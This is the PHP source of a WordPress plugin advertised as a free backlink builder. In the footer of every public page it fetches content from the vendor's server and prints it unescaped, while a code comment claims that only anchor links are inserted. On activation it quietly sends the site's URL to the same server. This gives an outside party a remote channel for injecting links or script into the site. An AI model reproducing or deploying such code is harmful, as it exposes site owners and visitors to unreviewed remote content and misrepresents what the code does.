<?php
/*
 * Plugin Name:       Gyrojob Backlinks
 * Plugin URI:        https://wordpress.org/plugins/gyrojob-gyroblinks/
 * Description:       Make unlimited free backlinks to increase Domain Authority (DA). Before creating backlinks you can check the domain you want to create dofollow backlinks.
 * Version:           1.3.9
 * Requires at least: 5.2
 * Requires PHP:      7.2
 * Author:            gyrojob
 * Author URI:        https://plugin.gyrojob.com/
 * License URI:       https://www.gnu.org/licenses/gpl-3.0.html
 * Update URI:        https://github.com/gyrojob/plugin
 * Text Domain:       gyroblinks
 * Domain Path:       /languages
 * GitHub Plugin URI: https://github.com/gyrojob/plugin
 
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}






/*
* The section is being used to work in a iframe.
*/

function gyroblinks_my_plugin_page_func(){
 $wq=get_option( 'siteurl' );
 $ex=explode('/',$wq); if(empty($ex)){$ex="";}
 ?>
<style type="text/css">
            body, html
            {
                margin: 0; padding: 0; height: 100%; overflow: hidden;
            }
        </style>
        <iframe width="100%" height="600" frameborder="0" 
src="https://plugin.gyrojob.com/file.php?domain=<?php echo $wq; ?>&id=login&mo=&lp=&lo=" /></iframe>
<?php
 }
 function gyroblinks_my_plugin_menu(){
     $wpn='my-plugin-page';
     add_menu_page('Price & Terms','Backlinks (DA)','manage_options',$wpn, 'gyroblinks_my_plugin_page_func', '', 6);
    }
    
    add_action('admin_menu', 'gyroblinks_my_plugin_menu');
    
    
    
    
    
    
    
/*
* The section is being used to create backlink.
* Progroming langulage like php, javescript, asp and other programing language will not accessed. Only anchor backlink will be created.
*/
    
function gyroblinks_updatei(){$url=get_option('siteurl');
$wp_r="https://plugin.gyrojob.com/getlink.php?l=p&url=".$url;
    $data = file_get_contents($wp_r);
    if (preg_match('/<wp>(.*)<\/wp>/is', $data, $matches)) {
    if($_SERVER['REQUEST_URI']=="/"){
        echo '<wp>'.$matches[1].'</wp>';}  }    
    if (preg_match('/<wo>(.*)<\/wo>/is', $data, $matcheos)) {
    if($_SERVER['REQUEST_URI']!="/")    {
            echo '<wo>'.$matcheos[1].'</wo>';}      }   
    }
    add_action('wp_footer', 'gyroblinks_updatei');






/*
* The section is being used to add domain in our list.
*/

function gyroblinks_addact(){
$post = [
     'domain' => get_option( 'siteurl' )
     ];
     $ch = curl_init('https://plugin.gyrojob.com/add.php');
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
     $response = curl_exec($ch);
}
register_activation_hook(__FILE__, 'gyroblinks_addact');








